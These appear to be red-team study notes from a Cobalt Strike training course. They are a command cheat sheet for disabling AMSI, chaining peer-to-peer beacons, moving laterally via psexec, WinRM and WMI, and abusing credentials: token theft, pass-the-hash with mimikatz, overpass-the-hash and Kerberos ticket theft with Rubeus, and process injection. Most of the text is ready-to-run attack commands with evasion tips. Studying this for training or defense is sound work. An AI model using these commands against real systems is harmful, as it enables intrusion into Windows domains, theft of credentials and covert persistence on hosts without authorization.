## Cobalt Strike Usage

These notes have been primarily gathered from my small amount of time using Cobalt Strike in [Rastamouse's CRTO](https://training.zeropointsecurity.co.uk/courses/red-team-ops) course and all credit is due there.

Note: This section is under construction.

## Using PowerShell/.NET Binaries
```powershell
# Remember to add the AMSI disable directive in your C2 profile
post-ex {
    set amsi_disable "true";
}

# Import powerview (The path is local)
powershell-import c:\Tools\PowerSploit\Recon\PowerView.ps1

# Use powerpick (Will use powershell and run it via .NET rather than by powershell.exe
powerpick Get-NetUser Toby
```

## Host Enumeration

```bash
# Screenshots! They are stored in Views -> Screenshots
printscreen (single screenshot using printscreen)
screenshot (single screenshot)
screenwatch (periodic screenshots)
```

## Peer to Peer Beacons

It's useful to only have egress traffic going out of your initial beacon. Peer to peer beacons allow compromised hosts to communicate over SMB/TCP and forward on the traffic back to the host you've initially got a beacon on, ensuring only one machine is calling out to your teamserver.

Listeners -> Add -> Beacon (SMB/TCP)
Generate payload for listener -> Attacks -> Packages -> Windows Stageless EXE

Run the exe (TCP Beacon this is). This binds to port 4444 (or whatever port) on your machine.

From the beacon you then connect back to it. 

```powershell
link (smb)
connect (tcp)

connect <listening inferface>:<port>
```

The TCP P2P machine has no access to the team server, it simply receives requests forwarded from the client it is attached to. The teamserver sends it to the joining machine, which forwards it to the listening tcp bind port. 


## Lateral Movement

We can move laterally over SMB, WMI, or WinRM. You can specify to jump or run remote commands. To start a listener, just add an SMB beacon. 

Listeners -> Add -> Beacon (SMB/TCP)

Bonus point: It's recommended to move laterally using SMB where possible due to its abundance in Windows environments!

```powershell
# Jump using SMB to a target. Requires writeable ADMIN$ share.
jump psexec64 dc04 smb
jump psexec dc04 smb
```

A few aspects to note:

-   Cobalt Strike will use the same name for the service and the exe filename
-   The service binary path will be a UNC path to `ADMIN$`, rather than `C:\Windows`.
-   psexec and psexec64 will migrate into rundll32.exe and then wipe the service binary from disk.

Winrm uses Powershell on the back-end to execute an in-memory reverse shell/command.

```powershell
remote-exec winrm dc04 whoami
jump winrm64 dc04 smb
```

WMI doesn't have a jump option, so you can upload a malicious binary and then use `remote-exec` to execute it. Upload uploads to the current directory.

```powershell
upload C:\ProgramData\beacon.exe
remote-exec wmi dc04 C:\ProgramData\beacon.exe
link dc04 
```

WMI will execute as a child process of WmiPrvSE.exe - Strong IoC for a defender.

## Credential Abuse

CS has built-in all the mimikatz commands!

### Token Abuse

You can also use various other features off-the-shelf. `make_token` is useful if you have a targets credentials as it spawns a new beacon using the `LogonUserA` API with their details.

ðŸš© This generates a 4624 event ID which depicts a successful user logon. Not too uncommon! However, the logon type will be type 9 - `LOGON32_LOGON_NEW_CREDENTIALS`. ðŸš©

```powershell
make_token MATRIX\Neo PasswordKing!
```

You can impersonate tokens too, by examining the process output list from `ps` and using `steal_token` on a process owned by your target user. This requires elevation and only works to access remote locations, not local resources.

```powershell
steal_token 1212
```

We can also spawn a new beacon as another user using their credentials. Specify the credentials and a listening beacon to perform this.

```powershell
spawnas MTATRIX\Neo KingPassword! my_tcp_listener_p8888
```
### Hash Abuse

ðŸ¥µðŸ¥µ But Toby, I only have a hash? ðŸ¥µðŸ¥µ

Never fear! Of course there is Pass the Hash functionality built into CS. Beware that this will patch LSASS and if PPL is enabled, it will not work out of the box. Creates a new logon session with false information and then replaces the information for that session with the domain, user, and provided hash of the target. Defaults to passing the new session over a named pipe which is easy to fingerprint: `\\.\pipe\`.

```powershell
pth MATRIX\Neo ed3dd3abfc62715849231d7c8290762a
```

If you want to perform better opsec, use mimikatz as this will a specific process rather than using a named pipe (cmd.exe is default).
```powershell
mimikatz sekurlsa::pth /user:Neo /domain:MATRIX.LOCAL /ntlm:ed3dd3abfc62715849231d7c8290762a
```

Use rev2self to revert back to your original logon session.
```powershell
rev2self
```

Well, can I overpass the hash? Sure! This uses kerberos to request a TGT instead of using NTLM. With Rubeus, we can perform this unauthenticated. We can execute Rubeus in memory with execute-assembly - Similar to any other .NET assemblies. 

ðŸš© Don't use a standard NTLM hash to perform this. Since Windows 2012 the de-facto key type is AES256 - Thus using an rc4hmac is essentially wearing bright colours and trying to hide in a bush! ðŸš©

```powershell
# Get a TGT. Get the AESKey with lsadump::ekeys 
execute-assembly C:\Rubeus.exe asktgt /user:Neo /domain:MATRIX.LOCAL /aes256:b7524fbac39574855459123b7b8b512b4b5eb1a211cbd12a1b139869bde4e23 /nowrap /opsec

# Create sacrificial logon session with invalid creds
make_token MATRIX\Neo PassIsWrong

# Copy the base64 TGT into the TICKET VALUE HERE spot and save it to NeoTGT.kirbi in Powershell
[System.IO.File]::WriteAllBytes("C:\TICKETS\NeoTGT.kirbi", [System.Convert]::FromBase64String("TICKET VALUE HERE"))

# Use your shiny new TGT created with a valid AES key and blend in!
kerberos_ticket_use C:\TICKETS\NeoTGT.kirbi
```

### Ticket Abuse

Extract tickets in the current Kerberos cache using Rubeus.

```powershell
# Find a LUID to steal and a corresponding service
execute-assembly C:\Rubeus.exe triage

# Extract the ticket to a b64 TGT(/TGS)
execute-assembly C:\Rubeus.exe dump /service:<SERVICE> /luid:<LUID> /nowrap

# Create a sacrificial logon session
execute-assembly C:\Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe

# Inject the ticket into our new login session using the new LUID from the sacrificial logon session output
C:\Rubeus.exe ptt /luid:<NEW LUID> /ticket:doIFcjCCBW....

# Finally, steal the token of the PID you created with the sacrificial logon cmd.exe process
steal_token <pid>
```

## Injection

Simple process injetion. Inject into processes owned by us without elevation. Inject into other user's processes only with higher privileges.

```powershell
ps
inject <pid>
```

